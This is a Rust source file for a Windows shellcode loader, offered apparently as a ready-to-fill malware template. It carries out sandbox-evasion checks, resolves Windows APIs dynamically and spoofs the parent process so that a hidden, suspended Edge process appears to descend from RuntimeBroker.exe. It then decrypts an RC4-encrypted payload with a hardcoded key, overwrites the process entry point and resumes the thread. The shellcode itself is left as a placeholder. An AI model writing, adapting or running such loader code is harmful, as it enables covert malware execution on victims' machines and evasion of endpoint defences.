
#![allow(warnings, unused)]
// add libc = "0.2" to your Cargo.toml under [dependencies] 
extern crate libc;
use std::os::raw::{c_void, c_int, c_short, c_char};
use std::ptr;

#[link(name = "kernel32")]
extern "stdcall" {
    pub fn LoadLibraryA(lpFileName: *const u8) -> *const usize;
    pub fn GetProcAddress(hModule: *const usize, lpProcName: *const u8) -> *const usize;
}



type LPSTR = *mut c_char;
type LPCSTR = *const c_char;
type HANDLE = *mut c_void;
type LPVOID = *mut c_void;
type PVOID = *mut c_void;
type SIZE_T = usize;
type DWORD = u32;
type PDWORD = *mut DWORD;
type BOOL = c_int;
type LPSTARTUPINFO = *mut STARTUPINFO;
type LPPROCESS_ATTRIBUTE_LIST = *mut PROCESS_ATTRIBUTE_LIST;
type LPPROCESS_INFORMATION = *mut PROCESS_INFORMATION;
type LPROCESS_BASIC_INFORMATION = *mut PROCESS_BASIC_INFORMATION;

#[repr(C)]
#[derive(Debug)]
struct STARTUPINFO {
    cb: u32,
    lpReserved: PVOID,
    lpDesktop: PVOID,
    lpTitle: PVOID,
    dwX: c_int,
    dwY: c_int,
    dwXSize: c_int,
    dwYSize: c_int,
    dwXCountChars: c_int,
    dwYCountChars: c_int,
    dwFillAttribute: c_int,
    dwFlags: u32,
    wShowWindow: u32,
    cbReserved2: c_short,
    lpReserved2: PVOID,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
}

impl Default for STARTUPINFO {
    fn default() -> Self {
        STARTUPINFO {
            cb: std::mem::size_of::<STARTUPINFO>() as u32,
            lpReserved: ptr::null_mut(),
            lpDesktop: ptr::null_mut(),
            lpTitle: ptr::null_mut(),
            dwX: 0,
            dwY: 0,
            dwXSize: 0,
            dwYSize: 0,
            dwXCountChars: 0,
            dwYCountChars: 0,
            dwFillAttribute: 0,
            dwFlags: 0,
            wShowWindow: 0,
            cbReserved2: 0,
            lpReserved2: ptr::null_mut(),
            hStdInput: ptr::null_mut(),
            hStdOutput: ptr::null_mut(),
            hStdError: ptr::null_mut(),
        }
    }
}

#[repr(C)]
struct STARTUPINFOEX {
    StartupInfo: STARTUPINFO,
    lpAttributeList: PVOID,
}
impl Default for STARTUPINFOEX {
    fn default() -> Self {
        STARTUPINFOEX {
            StartupInfo: STARTUPINFO::default(),
            lpAttributeList: ptr::null_mut(),
        }
    }
}

#[repr(C)]
struct PROCESS_ATTRIBUTE_LIST {
    dwFlags: DWORD,
    Size: SIZE_T,
    Count: SIZE_T,
    Reserved: [usize; 1],
}

impl Default for PROCESS_ATTRIBUTE_LIST {
    fn default() -> Self {
        PROCESS_ATTRIBUTE_LIST {
            dwFlags: 0,
            Size: std::mem::size_of::<PROCESS_ATTRIBUTE_LIST>(),
            Count: 0,
            Reserved: [0; 1],
        }
    }
}


#[repr(C)]
struct SECURITY_ATTRIBUTES {
    nLength: DWORD,
    lpSecurityDescriptor: PVOID,
    bInheritHandle: BOOL,
}

impl Default for SECURITY_ATTRIBUTES {
    fn default() -> Self {
        SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
            lpSecurityDescriptor: ptr::null_mut(),
            bInheritHandle: 0,
        }
    }
}


#[derive(Debug)]
#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: DWORD,
    dwThreadId: DWORD,
}

impl Default for PROCESS_INFORMATION {
    fn default() -> Self {
        PROCESS_INFORMATION {
            hProcess: ptr::null_mut(),
            hThread: ptr::null_mut(),
            dwProcessId: 0,
            dwThreadId: 0,
        }
    }
}

#[repr(C)]
#[derive(Debug)]
struct PROCESS_BASIC_INFORMATION {
    Reserved1: PVOID,
    PebAddress: PVOID,
    Reserved2: PVOID,
    Reserved3: PVOID,
    UniquePid: PVOID,
    MoreReserved: PVOID,
}

impl Default for PROCESS_BASIC_INFORMATION {
    fn default() -> Self {
        PROCESS_BASIC_INFORMATION {
            Reserved1: ptr::null_mut(),
            PebAddress: ptr::null_mut(),
            Reserved2: ptr::null_mut(),
            Reserved3: ptr::null_mut(),
            UniquePid: ptr::null_mut(),
            MoreReserved: ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Debug)]
pub struct PROCESSENTRY32 {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: u64,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [c_char; 260],
}

impl Default for PROCESSENTRY32 {
    fn default() -> Self {
        PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            cntUsage: 0,
            th32ProcessID: 0,
            th32DefaultHeapID: 0,
            th32ModuleID: 0,
            cntThreads: 0,
            th32ParentProcessID: 0,
            pcPriClassBase: 0,
            dwFlags: 0,
            szExeFile: [0; 260],
        }
    }
}



type FnVirtualAllocExNuma = extern "stdcall" fn(hProcess: HANDLE, lpAddress: PVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD) -> LPVOID;
type FnGetCurrentProcess = extern "stdcall" fn() -> LPVOID;
type FnFlsAlloc = extern "stdcall" fn(lpCallback: LPVOID) -> DWORD;
type FnCreateProcess = extern "stdcall" fn(
    lpApplicationName: LPCSTR,
    lpCommandLine: LPSTR,
    lpProcessAttributes: *mut SECURITY_ATTRIBUTES,
    lpThreadAttributes: *mut SECURITY_ATTRIBUTES,
    bInheritHandles: BOOL,
    dwCreationFlags: DWORD,
    lpEnvironment: LPVOID,
    lpCurrentDirectory: LPCSTR,
    lpStartupInfo: LPSTARTUPINFO,
    lpProcessInformation: LPPROCESS_INFORMATION,
) -> BOOL;
type FnOpenProcess = extern "stdcall" fn(processAccess: DWORD, bInheritHandle: BOOL, processId: DWORD) -> LPVOID;
type FnZwQueryInformationProcess = extern "stdcall" fn(hProcess: HANDLE, procInformationClass: DWORD, procInformation: LPROCESS_BASIC_INFORMATION, ProcInfoLen: DWORD, retlen: PDWORD) -> c_int;
type FnReadProcessMemory = extern "stdcall" fn(hProcess: HANDLE, lpBaseAddress: PVOID, lpBuffer: LPVOID, nSize: SIZE_T, lpNumberOfBytesRead: PDWORD) -> BOOL;
type FnWriteProcessMemory = extern "stdcall" fn(hProcess: LPVOID, lpBaseAddress: LPVOID, lpBuffer: LPVOID, size: SIZE_T, lpNumberOfBytesWrittern: PDWORD) -> BOOL;
type FnResumeThread = extern "stdcall" fn(hThread: HANDLE) -> DWORD;
type FnInitializeProcThreadAttributeList = extern "stdcall" fn(lpAttributeList: *mut c_void, dwAttributeCount: u32, dwFlags: u32, lpSize: *mut usize) -> c_int;
type FnUpdateProcThreadAttribute = extern "stdcall" fn(lpAttributeList: *mut c_void, dwFlags: u32, Attribute: usize, lpValue: *mut c_void, cbSize: usize, lpPreviousValue: *mut c_void, lpReturnSize: *mut usize) -> c_int;

type FnCreateToolhelp32Snapshot = extern "stdcall" fn(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
type FnProcess32First = extern "stdcall" fn(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> i32;
type FnProcess32Next = extern "stdcall" fn(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> i32;

const PAGE_EXECUTE_READ_WRITE: DWORD = 0x40;
const MEM_RESERVE: DWORD = 0x2000;
const MEM_COMMIT: DWORD = 0x1000;

const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: SIZE_T = 0x00020000;
const PROCESS_CREATE_PROCESS: DWORD = 0x0080;
const PROCESS_DUP_HANDLE: DWORD = 0x0040;

const SW_HIDE: i32 = 0;
const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
const STARTF_USESTDHANDLES: DWORD = 0x00000100;
const CREATE_SUSPENDED: DWORD = 0x00000004;
const EXTENDED_STARTUPINFO_PRESENT: DWORD = 0x00080000;
const CREATE_NO_WINDOW: DWORD = 0x08000000;

const TH32CS_SNAPPROCESS: DWORD = 0x00000002;

fn main() {

    const KERNEL32_DLL: &'static [u8] = b"kernel32\0";
    
    const VIRTUALALLOCEXNUMA: &'static [u8] = b"VirtualAllocExNuma\0";
    const GETCURRENTPROCESS: &'static [u8] = b"GetCurrentProcess\0";
    const FLSALLOC: &'static [u8] = b"FlsAlloc\0";

	unsafe {
		let module_kernel32 = LoadLibraryA(KERNEL32_DLL.as_ptr() as *const u8);

        let h_virtual_alloc_ex_numa = GetProcAddress(module_kernel32, VIRTUALALLOCEXNUMA.as_ptr() as *const u8);
        let h_get_current_process = GetProcAddress(module_kernel32, GETCURRENTPROCESS.as_ptr() as *const u8);
        let h_fls_alloc = GetProcAddress(module_kernel32, FLSALLOC.as_ptr() as *const u8);

        let VirtualAllocExNuma = std::mem::transmute::<*const usize, FnVirtualAllocExNuma>(h_virtual_alloc_ex_numa);
        let GetCurrentProcess = std::mem::transmute::<*const usize, FnGetCurrentProcess>(h_get_current_process);
        let FlsAlloc = std::mem::transmute::<*const usize, FnFlsAlloc>(h_fls_alloc);

		let mem = VirtualAllocExNuma(GetCurrentProcess(), ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ_WRITE, 0);
        if mem == ptr::null_mut() {
            return;
        }
        let check = FlsAlloc(ptr::null_mut());
        if check == 0xFFFFFFFF {
            return;
        }
		// You can add more Sandbox Evasion Techniques above ^

        // Your Encrypted RC4 Shellcode
		let mut buf: Vec<u8> = vec![0x00, 0x00, 0x00, 0x00]; 
		// RC4 Decryption Key 
	    let key: Vec<u8> = vec![ 0x63, 0x76, 0x52, 0x23, 0x78, 0x5e, 0x38, 0x5a, 0x45, 0x59, 0x59, 0x64, 0x36, 0x4b, 0x33, 0x6f, 0x42, 0x24, 0x38, 0x53, 0x21, 0x21, 0x6a, 0x54, 0x4e, 0x4c, 0x38, 0x61, 0x78, 0x32, 0x6b ]; 
        start(module_kernel32, &mut buf, &key);
	}
}

unsafe fn start(module_kernel32: *const usize,  buf: &mut Vec<u8>, key: &Vec<u8>) {
    const NTDLL_DLL: &'static [u8] = b"ntdll\0";
    let module_ntdll = LoadLibraryA(NTDLL_DLL.as_ptr() as *const u8);

    const ZWQUERYINFORMATIONPROCESS: &'static [u8] = b"ZwQueryInformationProcess\0";
    const READPROCESSMEMORY: &'static [u8] = b"ReadProcessMemory\0";
    const WRITEPROCESSMEMORY: &'static [u8] = b"WriteProcessMemory\0";
    const RESUMETHREAD: &'static [u8] = b"ResumeThread\0";

    let h_zwquery_information_process = GetProcAddress(module_ntdll, ZWQUERYINFORMATIONPROCESS.as_ptr() as *const u8);
    let h_read_process_memory = GetProcAddress(module_kernel32, READPROCESSMEMORY.as_ptr() as *const u8);
    let h_write_process_memory = GetProcAddress(module_kernel32, WRITEPROCESSMEMORY.as_ptr() as *const u8);
    let h_resume_thread = GetProcAddress(module_kernel32, RESUMETHREAD.as_ptr() as *const u8);

    let ZwQueryInformationProcess = std::mem::transmute::<*const usize, FnZwQueryInformationProcess>(h_zwquery_information_process);
    let ReadProcessMemory = std::mem::transmute::<*const usize, FnReadProcessMemory>(h_read_process_memory);
    let WriteProcessMemory = std::mem::transmute::<*const usize, FnWriteProcessMemory>(h_write_process_memory);
    let ResumeThread = std::mem::transmute::<*const usize, FnResumeThread>(h_resume_thread);
    
    // Target Process to Spoof
    let parrent_pid = get_pid(module_kernel32, "RuntimeBroker.exe"); 
    
    let mut pi = spoof_ppid(module_kernel32, parrent_pid, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
    
    let mut bi = PROCESS_BASIC_INFORMATION::default();
    let h_process: HANDLE = pi.hProcess;  
    let h_thread: HANDLE = pi.hThread;
    ZwQueryInformationProcess(h_process, 0, &mut bi , (std::mem::size_of::<usize>() * 6) as u32, ptr::null_mut());

    let image_base_offset = bi.PebAddress as u64 + 0x10;

    let mut image_base_buffer = [0; std::mem::size_of::<usize>()];

    ReadProcessMemory(h_process, image_base_offset as LPVOID, image_base_buffer.as_mut_ptr() as LPVOID, image_base_buffer.len(), ptr::null_mut());

    let image_base_address = usize::from_ne_bytes(image_base_buffer);

    let mut header_buffer = [0; 0x200];
    ReadProcessMemory(h_process, image_base_address as LPVOID, header_buffer.as_mut_ptr() as LPVOID, header_buffer.len(), ptr::null_mut());

    let e_lfanew_offset = u32::from_ne_bytes(header_buffer[0x3C..0x40].try_into().unwrap());
    let option_header = e_lfanew_offset + 0x28;
    let entry_point = u32::from_ne_bytes(header_buffer[option_header as usize..(option_header+4) as usize].try_into().unwrap());
    let entry_point_address = (entry_point as usize + image_base_address) as LPVOID;
    decrypt(buf, &key);
    WriteProcessMemory(h_process, entry_point_address, buf.as_ptr() as LPVOID, buf.len(), ptr::null_mut());
    ResumeThread(h_thread);
}


unsafe fn spoof_ppid(module_kernel32: *const usize, parent_id: DWORD, child_path: &str) -> PROCESS_INFORMATION {
    
    const CREATEPROCESS: &'static [u8] = b"CreateProcessA\0";
    const OPENPROCESS: &'static [u8] = b"OpenProcess\0";
    const INITIALIZEPROCTHREADATTRIBUTELIST: &'static [u8] = b"InitializeProcThreadAttributeList\0";
    const UPDATEPROCTHREADATTRIBUTE: &'static [u8] = b"UpdateProcThreadAttribute\0";

    let h_create_process = GetProcAddress(module_kernel32, CREATEPROCESS.as_ptr() as *const u8);
    let h_open_process = GetProcAddress(module_kernel32, OPENPROCESS.as_ptr() as *const u8);
    let h_init_proc_thread_attr = GetProcAddress(module_kernel32, INITIALIZEPROCTHREADATTRIBUTELIST.as_ptr());
    let h_update_proc_thread_attr = GetProcAddress(module_kernel32, UPDATEPROCTHREADATTRIBUTE.as_ptr());

    let CreateProcess = std::mem::transmute::<*const usize, FnCreateProcess>(h_create_process);
    let OpenProcess = std::mem::transmute::<*const usize, FnOpenProcess>(h_open_process);
    let InitializeProcThreadAttributeList = std::mem::transmute::<*const usize, FnInitializeProcThreadAttributeList>(h_init_proc_thread_attr);
    let UpdateProcThreadAttribute = std::mem::transmute::<*const usize, FnUpdateProcThreadAttribute>(h_update_proc_thread_attr);
        
    let mut pi_info = PROCESS_INFORMATION::default();
    let mut si_ex: STARTUPINFOEX = STARTUPINFOEX::default();
    let mut ph_value: PVOID = ptr::null_mut();
    let mut lpSize: SIZE_T = 0;

    InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut lpSize);

    si_ex.lpAttributeList = libc::malloc(lpSize) as *mut c_void;
    
    InitializeProcThreadAttributeList(si_ex.lpAttributeList, 1, 0, &mut lpSize);
    let parent_handle = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, 0, parent_id);
    if parent_handle.is_null() {
        return pi_info;
    }


    ph_value = libc::malloc(std::mem::size_of::<HANDLE>()) as PVOID;
    ptr::write(ph_value as *mut HANDLE, parent_handle);
    UpdateProcThreadAttribute(
        si_ex.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ph_value,
        std::mem::size_of::<HANDLE>(),
        ptr::null_mut(),
        ptr::null_mut(),
    );

    ptr::write(&mut si_ex.StartupInfo.dwFlags, STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    ptr::write(&mut si_ex.StartupInfo.wShowWindow, 0);
    si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEX>() as u32;

    let mut ps = SECURITY_ATTRIBUTES::default();
    let mut ts = SECURITY_ATTRIBUTES::default();

    let child_path_cstring = std::ffi::CString::new(child_path).unwrap();
    let result = CreateProcess(
        child_path_cstring.as_ptr(),
        ptr::null_mut(),
        &mut ps,
        &mut ts,
        1,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        ptr::null_mut(),
        ptr::null(),
        &mut si_ex.StartupInfo,
        &mut pi_info,
    );

    // Cleanup and return the result
    libc::free(ph_value as *mut c_void);
    libc::free(si_ex.lpAttributeList as *mut c_void);
    
    pi_info
}

unsafe fn get_pid(module_kernel32: *const usize, target_process: &str) -> u32 {

    const CREATETOOLHELP32SNAPSHOT: &'static [u8] = b"CreateToolhelp32Snapshot\0";
    const PROCESS32FIRST: &'static [u8] = b"Process32First\0";
    const PROCESS32NEXT: &'static [u8] = b"Process32Next\0";


    let h_create_tool_helper32_snapshot = GetProcAddress(module_kernel32, CREATETOOLHELP32SNAPSHOT.as_ptr() as *const u8);
    let h_process32_first = GetProcAddress(module_kernel32, PROCESS32FIRST.as_ptr() as *const u8);
    let h_process32_next = GetProcAddress(module_kernel32, PROCESS32NEXT.as_ptr() as *const u8);
    if h_create_tool_helper32_snapshot.is_null() || h_process32_first.is_null() || h_process32_next.is_null() {
        return 0;
    }
    
    let CreateToolhelp32Snapshot = std::mem::transmute::<*const usize, FnCreateToolhelp32Snapshot>(h_create_tool_helper32_snapshot);
    let Process32First = std::mem::transmute::<*const usize, FnProcess32First>(h_process32_first);
    let Process32Next = std::mem::transmute::<*const usize, FnProcess32Next>(h_process32_next);

    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if snapshot == ptr::null_mut() {
        
        return 0;
    }
    
    let mut entry = PROCESSENTRY32::default();
    
    if Process32First(snapshot, &mut entry) != 0 {
        
        loop {
            let raw_ptr = entry.szExeFile.as_ptr();
            let c_str = std::ffi::CStr::from_ptr(raw_ptr);
            let current_process_name = c_str.to_string_lossy();
            if current_process_name.to_lowercase() == target_process.to_lowercase() {
                
                return entry.th32ProcessID;
            }

            if Process32Next(snapshot, &mut entry) == 0 {
                break;
            }
        }
    }
    0
}
fn decrypt(buf: &mut Vec<u8>, key: &Vec<u8>) {
    
    let mut i: usize = 0;
    let mut j: usize = 0;

    let mut perm: Vec<usize> = (0..256).collect();

    for k in 0..256 {
        j = (j + perm[k] + key[k % key.len()] as usize) % 256;
        perm.swap(k, j);
    }

    j = 0;
    for k in 0..buf.len() {
        i = (i + 1) % 256;
        j = (j + perm[i]) % 256;
        perm.swap(i, j);
        let t = (perm[i] + perm[j]) % 256;
        buf[k] ^= perm[t] as u8;
    }
}


